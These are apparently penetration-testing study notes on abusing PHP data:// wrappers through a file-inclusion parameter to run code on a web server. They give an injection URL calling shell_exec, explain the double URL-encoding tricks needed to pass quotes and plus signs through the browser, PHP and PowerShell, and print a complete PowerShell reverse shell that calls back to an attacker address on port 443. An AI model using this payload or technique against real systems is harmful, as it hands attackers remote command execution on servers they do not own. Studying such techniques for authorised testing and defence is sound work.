## PHP Wrappers

### Data Wrapper

Usage:  `data:TYPE,DATA`

Data wrappers can be used instead of having to reference an actual file.  Embed inline data as part of the URL with plaintext or Base64 encoding.  This allows for alternative payload without having to store anything.  Specify the TYPE, such as `text/plain` or  `text/plain;base64`.  

You can think of this as being treated like a reference to a file, except you are supplying the file in the URL.  PHP code could also be inserted here since it will be process as if it were in a file.  It's more similar to LFI since it executes whatever code has been submitted to it.

Example:  

```html
http://192.168.216.10/menu.php?file=data:text/plain,<?php echo shell_exec('cd') ?>
```

#### Quotes

- Double-quotes - PHP will render the code inside the quotes, meaning it will interpret special characters like `&`.
- Single-quotes - PHP will interpret everything inside literally EXCEPT for another single quote `'` and the plus sign `+`.  You must escape double-quotes and replace plus signs with HTML encoding `%2B`.

#### Escaping Characters

This was a painful lesson, but you need to carefully consider the order of how things are interpreted here.   Note: the double-encoding may not be necessary if using curl.

1. The browser will first render your code, interpreting all the % characters into their appropriate characters.
2. The browser passes this rendered code to PHP, which will do its own rendering.  PHP interprets some characters the same way as the browser, so that means some characters may need to be encoded twice, like plus signs (+).
3. Finally, PHP will pass it's rendered code onto any third party processes, like the command line or PowerShell.  So if you need a + to be passed to PowerShell, it must be encoded twice or it will be replaced with a space.

For example, to pass the Powershell Reverse Shell code, there are two issues that you will have:  (1) the single quotes inside the command and (2) the plus signs (+) in the command.  

1. You need to enclose your entire Powershell command in single quotes like this:  `data:text/plain,<?php echo shell_exec('PS_REVERSE_CMD_HERE') ?>`
2. You need to use the backslash to escape all the single quotes INSIDE the PS command.  Be sure you don't accidentally escape the single quotes that are around the Powershell command.
3. You need to REPLACE any plus characters (+) with the HTML code `%2B` which will allow it to pass through PHP.  You may think that encoding the entire string as a URL will do this for you, and it does, but you need it encoded twice.  As described above, if you only encode it once, then the browser will see the %2B, decode that as a + and pass it on to PHP, which will then replace it with a space, and pass it on to Powershell, which causes an error.  If you encode it twice, then the browser will decode it to %2B first, then pass that to PHP, which decodes it as a + and passes it to Powershell.
4. Finally you encode everything from the word "data:text/plain....." to  the end as a URL, which will do the necessary replacement of characters  with % HTML notation.

The unencoded code is shown below:

```php
data:text/plain,<?php echo shell_exec('powershell -c "$client = New-Object System.Net.Sockets.TCPClient(\'192.168.119.216\',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback %2B \'PS \' %2B (pwd).Path %2B \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"') ?>
```

More Wrappers:  https://www.php.net/manual/en/wrappers.php

